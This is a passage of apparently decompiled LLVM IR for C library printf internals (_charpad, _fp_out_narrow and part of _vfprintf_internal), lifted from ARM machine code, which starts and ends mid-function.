  ret i32 %v2_102cc

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @_charpad(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i8, align 1
  %v3_102d4 = load i32, i32* @r4, align 4
  %v6_102d4 = load i32, i32* @r5, align 4
  %v9_102d4 = load i32, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg3, i32* @r4, align 4
  store i8 %arg2, i8* %stack_var_-17, align 1
  %v2_102f42 = icmp eq i32 %arg3, 0
  %v2_102f8 = ptrtoint i8* %stack_var_-17 to i32
  br i1 %v2_102f42, label %dec_label_pc_10314, label %dec_label_pc_10308

dec_label_pc_102f0:                               ; preds = %dec_label_pc_10308
  %v1_102f0 = add i32 %v0_102f0, -1
  store i32 %v1_102f0, i32* @r4, align 4
  %v2_102f4 = icmp eq i32 %v1_102f0, 0
  %v0_10300 = load i32, i32* @r6, align 4
  br i1 %v2_102f4, label %dec_label_pc_10314.loopexit, label %dec_label_pc_10308

dec_label_pc_10308:                               ; preds = %entry, %dec_label_pc_102f0
  %v0_103004 = phi i32 [ %v0_10300, %dec_label_pc_102f0 ], [ %arg1, %entry ]
  %v3_10308 = call i32 @__stdio_fwrite(i32 %v2_102f8, i32 1, i32 %v0_103004)
  %v7_1030c = icmp eq i32 %v3_10308, 1
  %v0_102f0 = load i32, i32* @r4, align 4
  br i1 %v7_1030c, label %dec_label_pc_102f0, label %dec_label_pc_10314.loopexit

dec_label_pc_10314.loopexit:                      ; preds = %dec_label_pc_102f0, %dec_label_pc_10308
  %v0_10314.ph = phi i32 [ %v0_102f0, %dec_label_pc_10308 ], [ 0, %dec_label_pc_102f0 ]
  %v1_10314.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_10314

dec_label_pc_10314:                               ; preds = %dec_label_pc_10314.loopexit, %entry
  %v1_10314 = phi i32 [ 0, %entry ], [ %v1_10314.pre, %dec_label_pc_10314.loopexit ]
  %v0_10314 = phi i32 [ 0, %entry ], [ %v0_10314.ph, %dec_label_pc_10314.loopexit ]
  %v2_10314 = sub i32 %v1_10314, %v0_10314
  store i32 %v3_102d4, i32* @r4, align 4
  store i32 %v6_102d4, i32* @r5, align 4
  store i32 %v9_102d4, i32* @r6, align 4
  ret i32 %v2_10314

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10314.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_10308, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg4 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_10320 = load i32, i32* @r4, align 4
  store i32 %v3_10320, i32* %stack_var_-24, align 4
  %v9_10320 = load i32, i32* @r6, align 4
  store i32 %arg2, i32* @r6, align 4
  %v1_10328 = and i32 %arg2, 128
  %v2_10328 = icmp eq i32 %v1_10328, 0
  %v0_1032c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1032c, i32* @r8, align 4
  store i32 %arg3, i32* %r4.global-to-local, align 4
  store i32 %tmp, i32* @r7, align 4
  br i1 %v2_10328, label %bb, label %dec_label_pc_10340

bb:                                               ; preds = %entry
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10380

dec_label_pc_10340:                               ; preds = %entry
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_10344 = call i32 @strlen(i8* %arg4)
  store i32 %v3_10344, i32* %r0.global-to-local, align 4
  %v1_10348 = load i32, i32* %r4.global-to-local, align 4
  %v2_10348 = sub i32 %v1_10348, %v3_10344
  store i32 %v2_10348, i32* @r4, align 4
  store i32 %v3_10344, i32* @r5, align 4
  %tmp16 = icmp slt i32 %v2_10348, 1
  br i1 %tmp16, label %.thread, label %dec_label_pc_10360

.thread:                                          ; preds = %dec_label_pc_10340
  store i32 %v3_10344, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10380

dec_label_pc_10360:                               ; preds = %dec_label_pc_10340
  %v0_10360 = load i32, i32* @r6, align 4
  %v1_10360 = urem i32 %v0_10360, 128
  %v0_10364 = load i32, i32* @r8, align 4
  store i32 %v0_10364, i32* %r0.global-to-local, align 4
  %v3_1036c = trunc i32 %v1_10360 to i8
  %v4_1036c = call i32 @_charpad(i32 %v0_10364, i8 %v3_1036c, i32 %v2_10348)
  store i32 %v4_1036c, i32* %r0.global-to-local, align 4
  %v1_10370 = load i32, i32* @r4, align 4
  %v9_10370 = icmp eq i32 %v4_1036c, %v1_10370
  store i32 %v4_1036c, i32* %r6.global-to-local, align 4
  br i1 %v9_10370, label %dec_label_pc_1037c, label %dec_label_pc_1039c

dec_label_pc_1037c:                               ; preds = %dec_label_pc_10360
  %v0_1037c = load i32, i32* @r5, align 4
  store i32 %v0_1037c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10380

dec_label_pc_10380:                               ; preds = %bb, %.thread, %dec_label_pc_1037c
  %v5_1038c = phi i32 [ %v0_1037c, %dec_label_pc_1037c ], [ %arg3, %bb ], [ %v3_10344, %.thread ]
  %tmp17 = icmp slt i32 %v5_1038c, 1
  br i1 %tmp17, label %.thread8, label %bb18

.thread8:                                         ; preds = %dec_label_pc_10380
  br label %bb19

bb18:                                             ; preds = %dec_label_pc_10380
  %v5_10388 = load i32, i32* @r7, align 4
  br label %bb19

bb19:                                             ; preds = %.thread8, %bb18
  %storemerge = phi i32 [ 0, %.thread8 ], [ %v5_10388, %bb18 ]
  %tmp20 = phi i1 [ false, %.thread8 ], [ true, %bb18 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %tmp20, i32 ptrtoint (i32* @global_var_13f74.630 to i32))
  %v0_10398 = load i32, i32* %r6.global-to-local, align 4
  %v2_10398 = add i32 %storemerge, %v0_10398
  store i32 %v2_10398, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1039c

dec_label_pc_1039c:                               ; preds = %dec_label_pc_10360, %bb19
  %v0_1039c = phi i32 [ %v4_1036c, %dec_label_pc_10360 ], [ %v2_10398, %bb19 ]
  store i32 %v0_1039c, i32* %r0.global-to-local, align 4
  %v2_103a0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_103a0, i32* %r4.global-to-local, align 4
  store i32 %v9_10320, i32* %r6.global-to-local, align 4
  ret i32 %v0_1039c

; uselistorder directives
  uselistorder i32 %v0_1039c, { 1, 0 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 5, 4, 7, 6, 1, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_1039c, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %dec_label_pc_10380, { 2, 1, 0 }
}

define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10, i32 %arg11) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp97 = call i32 @__decompiler_undefined_function_0()
  %tmp99 = call i8 @__decompiler_undefined_function_2()
  %tmp100 = call i32 @__decompiler_undefined_function_0()
  %tmp101 = call i32 @__decompiler_undefined_function_0()
  %tmp102 = call i32 @__decompiler_undefined_function_0()
  %tmp103 = call i32 @__decompiler_undefined_function_0()
  %tmp104 = call i8 @__decompiler_undefined_function_2()
  %tmp105 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-53 = alloca i32, align 4
  %stack_var_-252 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_103a4 = load i32, i32* @r4, align 4
  store i32 %v3_103a4, i32* %stack_var_-36, align 4
  %v6_103a4 = load i32, i32* @r5, align 4
  %v15_103a4 = load i32, i32* @r8, align 4
  %v18_103a4 = load i32, i32* @sb, align 4
  %v21_103a4 = load i32, i32* @sl, align 4
  %v24_103a4 = load i32, i32* @fp, align 4
  %v2_103ac = ptrtoint i32* %stack_var_-332 to i32
  store i32 %v2_103ac, i32* @r6, align 4
  store i32 %arg1, i32* @fp, align 4
  store i32 %v2_103ac, i32* %r0.global-to-local, align 4
  %v0_103b8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_103b8, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_103c0 = call i32 @_ppfs_init(i32* nonnull %stack_var_-332)
  store i32 %v2_103c0, i32* %r0.global-to-local, align 4
  %v1_103c4 = icmp slt i32 %v2_103c0, 0
  br i1 %v1_103c4, label %dec_label_pc_103cc, label %dec_label_pc_10400

dec_label_pc_103cc:                               ; preds = %entry
  %v3_103cc = load i32, i32* %stack_var_-332, align 4
  store i32 %v3_103cc, i32* @r4, align 4
  %v1_103d0 = inttoptr i32 %v3_103cc to i8*
  store i32 %v3_103cc, i32* %r0.global-to-local, align 4
  %v3_103d4 = call i32 @strlen(i8* %v1_103d0)
  store i32 %v3_103d4, i32* %r0.global-to-local, align 4
  %v2_103d8 = icmp eq i32 %v3_103d4, 0
  br i1 %v2_103d8, label %bb, label %dec_label_pc_103e8

bb:                                               ; preds = %dec_label_pc_103cc
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10978

dec_label_pc_103e8:                               ; preds = %dec_label_pc_103cc
  %v0_103e8 = load i32, i32* @r4, align 4
  store i32 %v0_103e8, i32* %r0.global-to-local, align 4
  %v0_103ec = load i32, i32* @fp, align 4
  store i32 %v0_103ec, i32* %r2.global-to-local, align 4
  %v3_103f0 = call i32 @__stdio_fwrite(i32 %v0_103e8, i32 %v3_103d4, i32 %v0_103ec)
  store i32 %v3_103f0, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10978

dec_label_pc_10400:                               ; preds = %entry
  store i32 %v2_103ac, i32* %r0.global-to-local, align 4
  %v0_10404 = load i32, i32* @r5, align 4
  %v2_10408 = call i32 @_ppfs_prepargs(i32 %v2_103ac, i32 %v0_10404)
  store i32 %v2_10408, i32* %r0.global-to-local, align 4
  store i32 0, i32* @ip, align 4
  %v4_104a8 = zext i8 %tmp104 to i32
  %v2_104b0 = ptrtoint i32* %stack_var_-252 to i32
  %v2_104d0 = ptrtoint i32* %stack_var_-36 to i32
  %v2_104e8 = icmp eq i32 %tmp102, 0
  %v1_104fc = inttoptr i32 %tmp101 to i32*
  %v2_107ec = ptrtoint i32* %stack_var_-180 to i32
  %v2_10708 = ptrtoint i32* %stack_var_-44 to i32
  %v2_1071c = ptrtoint i32* %stack_var_-52 to i32
  %v3_106b8 = add i32 %tmp101, 4
  %v4_106b8 = inttoptr i32 %v3_106b8 to i32*
  %v2_106bc = ptrtoint i32* %stack_var_-328 to i32
  %v7_1057c = zext i8 %tmp99 to i32
  %v2_105b8 = ptrtoint i32* %stack_var_-53 to i32
  %v5_105c0 = bitcast i32* %stack_var_-53 to i8*
  %v2_105c8 = icmp ugt i32 %tmp102, 4
  %v7_105c8 = icmp eq i32 %tmp102, 5
  %v0_10960.pre = load i32, i32* @r4, align 4
  %tmp132 = icmp slt i32 %tmp105, 1
  %v5_104e0187 = icmp sgt i32 %tmp103, 0
  %tmp195 = icmp ugt i32 %tmp102, 7
  %tmp196 = icmp ugt i32 %tmp102, 15
  %v2_106dc = icmp ugt i32 %tmp102, 16
  %v7_106dc = icmp eq i32 %tmp102, 17
  %v2_106e0 = xor i1 %v7_106dc, true
  %v3_106e0 = and i1 %v2_106dc, %v2_106e0
  %v2_1077c = icmp ugt i32 %tmp102, 18
  %v7_1077c = icmp eq i32 %tmp102, 19
  %v2_10780 = xor i1 %v7_1077c, true
  %v3_10780 = and i1 %v2_1077c, %v2_10780
  %v7_107e0 = icmp eq i32 %tmp102, 20
  %v2_10520 = add i32 %tmp102, ptrtoint (i32* @global_var_1a0c0.632 to i32)
  %v1_10524 = add i32 %tmp102, add (i32 ptrtoint (i32* @global_var_1a0c0.632 to i32), i32 -1)
  %v2_10524 = inttoptr i32 %v1_10524 to i8*
  %v2_10550 = xor i1 %v7_105c8, true
  %v3_10550 = and i1 %v2_105c8, %v2_10550
  %v7_10584 = icmp eq i32 %tmp102, 1
  %v2_105d0 = xor i1 %v2_105c8, true
  %v3_105d0 = or i1 %v7_105c8, %v2_105d0
  %tmp197 = icmp ult i32 %tmp102, 3
  %v7_10638 = icmp eq i32 %tmp102, 3
  %v11_10644 = icmp eq i32 %tmp102, 4
  %v9_104b4 = mul nuw nsw i32 %v4_104a8, 8
  %v10_104b4 = add nsw i32 %v9_104b4, -8
  %v6_104bc = add i32 %v10_104b4, %v2_104b0
  br label %dec_label_pc_10960

bb126:                                            ; preds = %dec_label_pc_10418.outer, %.thread7
  %v2_10418185 = phi i8 [ %v2_10418, %.thread7 ], [ %v2_10418181, %dec_label_pc_10418.outer ]
  %v1_1042c184 = phi i32 [ %v2_1042c, %.thread7 ], [ %v0_1041849, %dec_label_pc_10418.outer ]
  %v8_10420 = icmp eq i8 %v2_10418185, 37
  br i1 %v8_10420, label %dec_label_pc_10434, label %.thread7

.thread7:                                         ; preds = %bb126
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_1042c = add i32 %v1_1042c184, 1
  store i32 %v2_1042c, i32* @r4, align 4
  %v1_10418 = inttoptr i32 %v2_1042c to i8*
  %v2_10418 = load i8, i8* %v1_10418, align 1
  %v3_10418 = zext i8 %v2_10418 to i32
  store i32 %v3_10418, i32* %r3.global-to-local, align 4
  %v2_1041c = icmp eq i8 %v2_10418, 0
  br i1 %v2_1041c, label %dec_label_pc_10434, label %bb126

dec_label_pc_10434:                               ; preds = %bb126, %.thread7, %dec_label_pc_10418.outer
  %v1_1042c.lcssa = phi i32 [ %v0_1041849, %dec_label_pc_10418.outer ], [ %v2_1042c, %.thread7 ], [ %v1_1042c184, %bb126 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10434 = sub i32 %v1_1042c.lcssa, %v5_10444
  %v9_10434 = icmp eq i32 %v1_1042c.lcssa, %v5_10444
  br i1 %v9_10434, label %dec_label_pc_10468, label %dec_label_pc_1043c

dec_label_pc_1043c:                               ; preds = %dec_label_pc_10434
  store i32 %v2_10434, i32* @r5, align 4
  %tmp128 = icmp slt i32 %v2_10434, 1
  br i1 %tmp128, label %bb130, label %bb129

bb129:                                            ; preds = %dec_label_pc_1043c
  store i32 %v5_10444, i32* %r0.global-to-local, align 4
  %v5_1044c = load i32, i32* @fp, align 4
  store i32 %v5_1044c, i32* %r2.global-to-local, align 4
  br label %bb130

bb130:                                            ; preds = %dec_label_pc_1043c, %bb129
  %tmp131 = phi i1 [ true, %bb129 ], [ false, %dec_label_pc_1043c ]
  call void @__pseudo_cond_branch(i1 %tmp131, i32 ptrtoint (i32* @global_var_13f74.630 to i32))
  %v0_10454 = load i32, i32* %r0.global-to-local, align 4
  %v1_10454 = load i32, i32* @r5, align 4
  %v9_10454 = icmp eq i32 %v0_10454, %v1_10454
  br i1 %v9_10454, label %dec_label_pc_1045c, label %dec_label_pc_10970

dec_label_pc_1045c:                               ; preds = %bb130
  %v2_10460 = add i32 %v0_10454, %stack_var_-336.1.ph
  %v0_10468.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10468

dec_label_pc_10468:                               ; preds = %dec_label_pc_10434, %dec_label_pc_1045c
  %v0_1047c = phi i32 [ %v5_10444, %dec_label_pc_10434 ], [ %v0_10468.pre, %dec_label_pc_1045c ]
  %stack_var_-336.2 = phi i32 [ %stack_var_-336.1.ph, %dec_label_pc_10434 ], [ %v2_10460, %dec_label_pc_1045c ]
  %v1_10468 = inttoptr i32 %v0_1047c to i8*
  %v2_10468 = load i8, i8* %v1_10468, align 1
  %v3_10468 = zext i8 %v2_10468 to i32
  store i32 %v3_10468, i32* %r3.global-to-local, align 4
  %v2_1046c = icmp eq i8 %v2_10468, 0
  br i1 %v2_1046c, label %dec_label_pc_10978, label %dec_label_pc_10474

dec_label_pc_10474:                               ; preds = %dec_label_pc_10468
  %v1_10474 = add i32 %v0_1047c, 1
  %v2_10474 = inttoptr i32 %v1_10474 to i8*
  %v3_10474 = load i8, i8* %v2_10474, align 1
  %v4_10474 = zext i8 %v3_10474 to i32
  store i32 %v4_10474, i32* %r3.global-to-local, align 4
  %v7_10478 = icmp eq i8 %v3_10474, 37
  store i32 %v1_10474, i32* %r2.global-to-local, align 4
  br i1 %v7_10478, label %dec_label_pc_10968, label %dec_label_pc_10484

dec_label_pc_10484:                               ; preds = %dec_label_pc_10474
  store i32 %v2_103ac, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_103ac, i32* %r0.global-to-local, align 4
  store i32 %v1_10474, i32* %stack_var_-332, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_10498 = call i32 @_ppfs_parsespec(i32* nonnull %stack_var_-332)
  store i32 %v2_103ac, i32* @r0, align 4
  %v0_104a0 = call i32 @_ppfs_setargs()
  store i32 %v0_104a0, i32* %r0.global-to-local, align 4
  store i32 %v4_104a8, i32* @ip, align 4
  store i32 %v2_104b0, i32* %r3.global-to-local, align 4
  br i1 %tmp132, label %.thread, label %bb133

.thread:                                          ; preds = %dec_label_pc_10484
  store i32 %tmp103, i32* %r0.global-to-local, align 4
  br label %bb134

bb133:                                            ; preds = %dec_label_pc_10484
  store i32 %tmp103, i32* %r0.global-to-local, align 4
  store i32 %v6_104bc, i32* %r3.global-to-local, align 4
  br label %bb134

bb134:                                            ; preds = %.thread, %bb133
  %v0_104c878 = phi i32 [ %v6_104bc, %bb133 ], [ %v2_104b0, %.thread ]
  store i32 %v2_104d0, i32* @lr, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br i1 %v5_104e0187, label %dec_label_pc_104c8, label %dec_label_pc_104e4

dec_label_pc_104c8:                               ; preds = %bb134, %dec_label_pc_104c8
  %v5_104d8189 = phi i32 [ %v5_104d8, %dec_label_pc_104c8 ], [ %v2_104d0, %bb134 ]
  %v0_104c8188 = phi i32 [ %v1_104cc, %dec_label_pc_104c8 ], [ %v0_104c878, %bb134 ]
  %v2_104c8 = add i32 %v5_104d8189, -4
  %v3_104c8 = inttoptr i32 %v2_104c8 to i32*
  store i32 %v0_104c8188, i32* %v3_104c8, align 4
  %v0_104cc = load i32, i32* %r3.global-to-local, align 4
  %v1_104cc = add i32 %v0_104cc, 8
  store i32 %v1_104cc, i32* %r3.global-to-local, align 4
  %v0_104d4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_104d4.pre = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_104d0, i32* @lr, align 4
  %v4_104d8 = mul i32 %v0_104d4.pre, 4
  %v5_104d8 = add i32 %v4_104d8, %v2_104d0
  %v1_104dc = add i32 %v0_104d4.pre, 1
  store i32 %v1_104dc, i32* %r2.global-to-local, align 4
  %v5_104e0 = icmp slt i32 %v0_104d4.pre, %v1_104d4.pre
  br i1 %v5_104e0, label %dec_label_pc_104c8, label %dec_label_pc_104e4

dec_label_pc_104e4:                               ; preds = %dec_label_pc_104c8, %bb134
  store i32 %tmp102, i32* %r2.global-to-local, align 4
  br i1 %v2_104e8, label %dec_label_pc_104f0, label %dec_label_pc_10514

dec_label_pc_104f0:                               ; preds = %dec_label_pc_104e4
  store i32 %tmp101, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-336.2, i32* @ip, align 4
  %v2_104fc = load i32, i32* %v1_104fc, align 4
  store i32 %v2_104fc, i32* %r0.global-to-local, align 4
  %v1_10500 = and i32 %v0_10544, 3840
  store i32 %stack_var_-336.2, i32* %r2.global-to-local, align 4
  %v3_10508 = ashr i32 %stack_var_-336.2, 31
  store i32 %v3_10508, i32* %r3.global-to-local, align 4
  %v4_1050c = inttoptr i32 %v2_104fc to i8*
  %v5_1050c = call i32 @_store_inttype(i8* %v4_1050c, i32 %v1_10500, i32 %stack_var_-336.2, i32 %v3_10508)
  store i32 %v5_1050c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1095c

dec_label_pc_10514:                               ; preds = %dec_label_pc_104e4
  br i1 %tmp195, label %dec_label_pc_106a0, label %dec_label_pc_1051c

dec_label_pc_1051c:                               ; preds = %dec_label_pc_10514
  store i32 %v2_10520, i32* %r3.global-to-local, align 4
  %v3_10524 = load i8, i8* %v2_10524, align 1
  %v4_10524 = zext i8 %v3_10524 to i32
  store i32 %v4_10524, i32* @r4, align 4
  %v7_10528 = icmp eq i8 %v3_10524, 10
  br i1 %v7_10528, label %dec_label_pc_10534, label %bb135

bb135:                                            ; preds = %dec_label_pc_1051c
  store i32 87, i32* @r5, align 4
  br label %bb139

dec_label_pc_10534:                               ; preds = %dec_label_pc_1051c
  store i32 %v0_10544, i32* %r3.global-to-local, align 4
  %v1_10538 = and i32 %v0_10544, 32
  %v2_10538 = icmp eq i32 %v1_10538, 0
  %.175 = select i1 %v2_10538, i32 87, i32 44
  store i32 %.175, i32* @r5, align 4
  %v1_10544 = and i32 %v0_10544, 64
  %v2_10544 = icmp eq i32 %v1_10544, 0
  br i1 %v2_10544, label %bb139, label %bb138

bb138:                                            ; preds = %dec_label_pc_10534
  %.176 = select i1 %v2_10538, i32 215, i32 172
  store i32 %.176, i32* @r5, align 4
  br label %bb139

bb139:                                            ; preds = %bb135, %dec_label_pc_10534, %bb138
  br i1 %v3_10550, label %.thread84, label %dec_label_pc_10558

.thread84:                                        ; preds = %bb139
  %v5_10550 = sub nsw i32 0, %v4_10524
  store i32 %v5_10550, i32* @r4, align 4
  br label %dec_label_pc_10570

dec_label_pc_10558:                               ; preds = %bb139
  br i1 %v7_10638, label %bb140, label %dec_label_pc_10564

bb140:                                            ; preds = %dec_label_pc_10558
  store i32 55, i32* @r5, align 4
  br label %dec_label_pc_10570

dec_label_pc_10564:                               ; preds = %dec_label_pc_10558
  br i1 %v7_10584, label %dec_label_pc_10574, label %dec_label_pc_10570

dec_label_pc_10570:                               ; preds = %.thread84, %bb140, %dec_label_pc_10564
  %v0_1059c86 = phi i32 [ %v5_10550, %.thread84 ], [ %v4_10524, %bb140 ], [ %v4_10524, %dec_label_pc_10564 ]
  br label %dec_label_pc_10574

dec_label_pc_10574:                               ; preds = %dec_label_pc_10564, %dec_label_pc_10570
  %v0_1059c85 = phi i32 [ %v0_1059c86, %dec_label_pc_10570 ], [ %v4_10524, %dec_label_pc_10564 ]
  %storemerge92 = phi i32 [ 11, %dec_label_pc_10570 ], [ 6, %dec_label_pc_10564 ]
  store i32 %storemerge92, i32* @r7, align 4
  %v3_10574 = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_10574, i32* %r3.global-to-local, align 4
  %v1_10578 = icmp slt i32 %v3_10574, 0
  %v7_1057c. = select i1 %v1_10578, i32 %v7_1057c, i32 32
  store i32 %v7_1057c., i32* @sb, align 4
  br i1 %v7_10584, label %bb145, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_10574
  store i32 %v2_104d0, i32* @lr, align 4
  %v2_1058c = load i32, i32* @ip, align 4
  %v5_1058c = mul i32 %v2_1058c, 4
  %v6_1058c = add i32 %v5_1058c, %v2_104d0
  store i32 %v6_1058c, i32* %r3.global-to-local, align 4
  %v2_10590 = add i32 %v6_1058c, -260
  %v3_10590 = inttoptr i32 %v2_10590 to i32*
  %v4_10590 = load i32, i32* %v3_10590, align 4
  store i32 %v4_10590, i32* %r3.global-to-local, align 4
  %v2_10598 = and i32 %v4_10590, 3840
  br label %bb145

bb145:                                            ; preds = %dec_label_pc_10574, %.thread16
  %storemerge94 = phi i32 [ %v2_10598, %.thread16 ], [ 1024, %dec_label_pc_10574 ]
  store i32 %storemerge94, i32* @r0, align 4
  store i32 %v0_1059c85, i32* @r2, align 4
  store i32 %tmp101, i32* @r1, align 4
  %v0_105a4 = call i32 @_load_inttype()
  %v0_105a8 = load i32, i32* @r1, align 4
  store i32 %v0_105a8, i32* %r2.global-to-local, align 4
  %v0_105b4 = load i32, i32* @r4, align 4
  store i32 %v0_105b4, i32* %r3.global-to-local, align 4
  store i32 %v2_105b8, i32* %r0.global-to-local, align 4
  %v0_105bc = load i32, i32* @r5, align 4
  %v6_105c0 = call i32 @_uintmaxtostr(i8* %v5_105c0, i32 %v0_105a4, i32 %v0_105a8, i32 %v0_105b4, i32 %v0_105bc)
  store i32 %v6_105c0, i32* %r0.global-to-local, align 4
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  store i32 %v6_105c0, i32* @r6, align 4
  br i1 %v3_105d0, label %bb148, label %dec_label_pc_105d4

dec_label_pc_105d4:                               ; preds = %bb145
  %v7_105c0 = inttoptr i32 %v6_105c0 to i8*
  %v3_105d4 = load i8, i8* %v7_105c0, align 1
  %v7_105d8 = icmp eq i8 %v3_105d4, 45
  %v2_105e0 = or i32 %v0_10544, 2
  %v2_105e0.stack_var_-316.4 = select i1 %v7_105d8, i32 %v2_105e0, i32 %v0_10544
  store i32 %v2_105e0.stack_var_-316.4, i32* %r3.global-to-local, align 4
  br i1 %v7_105d8, label %.thread18, label %dec_label_pc_105f4

.thread18:                                        ; preds = %dec_label_pc_105d4
  %v3_105e4 = add i32 %v6_105c0, 1
  store i32 %v3_105e4, i32* @r6, align 4
  store i32 2, i32* @r7, align 4
  br label %bb148

dec_label_pc_105f4:                               ; preds = %dec_label_pc_105d4
  %v1_105f4 = and i32 %v2_105e0.stack_var_-316.4, 2
  %v2_105f4 = icmp eq i32 %v1_105f4, 0
  br i1 %v2_105f4, label %dec_label_pc_10600, label %bb146

bb146:                                            ; preds = %dec_label_pc_105f4
  store i32 0, i32* @r7, align 4
  br label %bb148

dec_label_pc_10600:                               ; preds = %dec_label_pc_105f4
  %v1_10600 = urem i32 %v2_105e0.stack_var_-316.4, 2
  %v2_10600 = icmp eq i32 %v1_10600, 0
  br i1 %v2_10600, label %bb148, label %bb147

bb147:                                            ; preds = %dec_label_pc_10600
  store i32 4, i32* @r7, align 4
  br label %bb148

bb148:                                            ; preds = %.thread18, %bb146, %bb145, %dec_label_pc_10600, %bb147
  %v0_1065c = phi i32 [ %v6_105c0, %bb145 ], [ %v3_105e4, %.thread18 ], [ %v6_105c0, %dec_label_pc_10600 ], [ %v6_105c0, %bb147 ], [ %v6_105c0, %bb146 ]
  %v0_10618 = phi i32 [ %v0_10544, %bb145 ], [ %v2_105e0, %.thread18 ], [ %v0_10544, %dec_label_pc_10600 ], [ %v0_10544, %bb147 ], [ %v0_10544, %bb146 ]
  %v3_10608 = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_10608, i32* %r2.global-to-local, align 4
  store i32 %v0_10618, i32* %r3.global-to-local, align 4
  %v1_10610 = icmp slt i32 %v3_10608, 0
  br i1 %v1_10610, label %bb149, label %bb150

bb149:                                            ; preds = %bb148
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %bb148, %bb149
  %v0_10640 = phi i32 [ %v3_10608, %bb148 ], [ 1, %bb149 ]
  %v1_10618 = and i32 %v0_10618, 16
  %v2_10618 = icmp eq i32 %v1_10618, 0
  store i32 %v2_107ec, i32* %r3.global-to-local, align 4
  %v2_10620 = sub i32 %v2_107ec, %v0_1065c
  %v1_10624 = add i32 %v2_10620, 127
  store i32 %v1_10624, i32* @r5, align 4
  br i1 %v2_10618, label %bb157, label %dec_label_pc_1062c

dec_label_pc_1062c:                               ; preds = %bb150
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  br i1 %tmp197, label %bb151, label %bb152

bb151:                                            ; preds = %dec_label_pc_1062c
  store i32 6, i32* @r7, align 4
  br label %bb152

bb152:                                            ; preds = %dec_label_pc_1062c, %bb151
  br i1 %v7_10638, label %bb153, label %bb154

bb153:                                            ; preds = %bb152
  store i32 9, i32* @r7, align 4
  br label %bb154

bb154:                                            ; preds = %bb152, %bb153
  %tmp198 = icmp ugt i32 %v0_10640, %v1_10624
  br i1 %tmp198, label %bb157, label %bb155

bb155:                                            ; preds = %bb154
  br i1 %v11_10644, label %dec_label_pc_1064c, label %bb157

dec_label_pc_1064c:                               ; preds = %bb155
  %v1_1064c = inttoptr i32 %v0_1065c to i8*
  %v2_1064c = load i8, i8* %v1_1064c, align 1
  %v3_1064c = zext i8 %v2_1064c to i32
  store i32 %v3_1064c, i32* %r3.global-to-local, align 4
  %v7_10650 = icmp eq i8 %v2_1064c, 48
  br i1 %v7_10650, label %bb156, label %.thread25

bb156:                                            ; preds = %dec_label_pc_1064c
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb157

.thread25:                                        ; preds = %dec_label_pc_1064c
  %v2_10658 = add i32 %v2_10620, 128
  store i32 %v2_10658, i32* %r2.global-to-local, align 4
  br label %bb157

bb157:                                            ; preds = %bb154, %bb156, %bb155, %bb150, %.thread25
